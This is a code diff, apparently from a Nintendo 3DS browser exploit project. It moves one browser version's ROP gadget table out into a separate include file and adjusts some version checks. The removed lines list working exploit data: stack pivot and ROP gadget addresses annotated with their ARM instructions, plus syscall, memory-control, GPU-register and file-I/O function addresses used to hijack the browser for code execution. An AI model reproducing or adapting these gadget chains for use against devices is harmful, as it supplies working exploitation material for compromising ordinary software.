@@ -163,79 +163,9 @@ if($ropchainselect == -1)
 
 if($browserver == 1)
 {
-	$CODEBLK_ENDADR = 0x00405000;
-	$OSSCRO_HEAPADR = 0x08385000;
-	$WEBKITCRO_HEAPADR = 0x08559000;
-	$APPHEAP_PHYSADDR = 0x24cff000;//physical address where the 0x08000000 heap is mapped.
-	init_mapaddrs_cro();
+	//For <v5.0 NATIVE_FIRM: $APPHEAP_PHYSADDR = 0x24cff000;
 
-	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2dec8;
-
-	$STACKPIVOT_ADR = 0x002d5684;
-	$THROW_FATALERR = 0x0025f214;
-	$COND_THROWFATALERR = 0x0013ba4c;//executes this when r0 bit31 is set: "blne throw_fatalerr". then: "pop {r3, pc}"
-
-	//$ROP_POP_R0R3PC = 0x002f7c34;//"pop {r0, r1, r2, r3, pc}"
-	$ROP_POP_R0R6PC = 0x0020f04c;//"pop {r0, r1, r2, r3, r4, r5, r6, pc}"
-	$ROP_POP_R0R8PC = 0x002218d0;//"pop {r0, r1, r2, r3, r4, r5, r6, r7, r8, pc}"
-	$ROP_POP_R0IPPC = 0x0022d984;//"pop {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"
-	$ROP_POP_R0PC = 0x002ac330;//"pop {r0, pc}"
-	$ROP_POP_R1R5PC = 0x001024c8;//"pop {r1, r2, r3, r4, r5, pc}"
-
-	$ROP_STR_R1TOR0 = 0x00140acc;//"str r1, [r0]" "bx lr"
-	$ROP_LDR_R0FROMR0 = 0x00179d54;//"ldr r0, [r0]" "bx lr"
-	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x001e96b4;//"str r1, [r0, r2, lsl #2]" "bx lr"
-	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x001649e8;//"ldr r0, [r0, r1, lsl #2]" "bx lr"
-	$ROP_ADDR0_TO_R1 = 0x0012d258;//"add r0, r0, r1" "bx lr"
-
-	$ROP_LDMSTM_R5R4_R0R3 = 0x00222830;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"
-
-	//$ROP_WRITEU32_TOTHREADSTORAGE = 0x00140a80;//"mrc 15, 0, r2, cr13, cr0, {3}" "ldr r0, [r0]" "str r1, [r2, r0, lsl #2]" "bx lr"
-	//$ROP_READU32_FROMTHREADSTORAGE = 0x001c6d24;//"mrc 15, 0, r1, cr13, cr0, {3}" "ldr r0, [r0]" "ldr r0, [r1, r0, lsl #2]" "bx lr"
-
-	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0025ee6c;//if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}
-
-	$ROP_STMR0_R0PC = 0x0010012c;//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}" "bx lr"
-
-	$ROP_INFINITELP = 0x0024847d;//thumb "b ."
-
-	//$ROP_CLOSEHANDLE = genu32_unicode(0x001569d0);//"ldr r0, [r5]", if(r0!=0){bl svcCloseHandle; str r4, [r5]} "mov r0, r4" "pop {r4, r5, r6, r7, r8, pc}"
-
-	$SRVPORT_HANDLEADR = 0x003b9448;
-	$SRV_REFCNT = 0x003b88fc;
-	//$ROP_SRVINIT = genu32_unicode(0x0025f170);
-	$srvpm_initialize = 0x00147864;
-	$srv_shutdown = 0x0014765c;
-	$srv_GetServiceHandle = 0x25f088;
-
-	$svcGetProcessId = 0x002a0a30;
-	$svcSendSyncRequest = 0x0025f080;//"svc 0x00000032" "bx lr"
-	$svcControlMemory = 0x002d5700;
-	$svcSleepThread = 0x002a3e84;
-
-	$GXLOW_CMD4 = 0x002c565c;
-	$GSP_FLUSHDCACHE = 0x00345ec8;
-	$GSP_WRITEHWREGS = 0x002b6c44;
-	$GSPGPU_SERVHANDLEADR = 0x003b9438;
-
-	$IFile_Open = 0x0025bc00;
-	$IFile_Close = 0x0025bd20;
-	$IFile_GetSize = 0x00301cd4;
-	$IFile_Read = 0x002fa864;
-	$IFile_Write = 0x00310190;
-
-	$FS_DELETEFILE = 0x00322e94;
-
-	$FSFILEIPC_CLOSE = 0x0013fc5c;
-	$FSFILEIPC_READ = 0x0013fc00;
-	$FSFILEIPC_GETSIZE = 0x0013fd04;
-
-	$OPENFILEDIRECTLY_WRAP = 0x0013ce28;
-
-	$APT_PrepareToDoApplicationJump = 0x00155224;
-	$APT_DoApplicationJump = 0x001542d4;
-
-	$ROP_snprintf = $OSSCRO_MAPADR+0x48c-0x4;
+	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v1024.php");
 }
 else if($browserver == 2)
 {
@@ -994,20 +924,7 @@ else
 
 if($browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
 
-if($browserver < 3 && $browserver!=0x2)
-{
-	$WKC_FOPEN = $OSSCRO_MAPADR+0x680;
-	$WKC_FCLOSE = $OSSCRO_MAPADR+0x678;
-	$WKC_FREAD = $OSSCRO_MAPADR+0x688;
-	$WKC_FWRITE = $OSSCRO_MAPADR+0x690;
-	$WKC_FSEEK = $OSSCRO_MAPADR+0x6a0;
-
-	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xea0;
-	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea8;
-	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xed0;
-	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
-}
-else if($browserver == 4)
+if($browserver == 4)
 {
 	$WKC_FOPEN = $OSSCRO_MAPADR+0x5cc;
 	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5c4;
@@ -1066,8 +983,8 @@ else if($browserver == 0x81)//new3ds
 
 if($browserver < 0x80)
 {
-	if($browserver < 6 && $browserver!=0x3 && $browserver!=0x2)$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
-	if($browserver < 6 && $browserver!=0x3 && $browserver!=0x2)$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
+	if($browserver < 6 && $browserver>0x3)$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
+	if($browserver < 6 && $browserver>0x3)$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
 }
 else if($browserver >= 0x80)
 {
@@ -1092,7 +1009,7 @@ if($browserver>=0x80)
 $STACKPIVOT = genu32_unicode_jswrap($STACKPIVOT_ADR);
 $POPLRPC = $STACKPIVOT_ADR + 0x18;//"pop {lr}" "pop {pc}"
 
-if($browserver < 5 && $browserver!=0x3 && $browserver!=0x2)
+if($browserver < 5 && $browserver>0x3)
 {
 	$POPPC = $STACKPIVOT_ADR + 0x1c;
 }
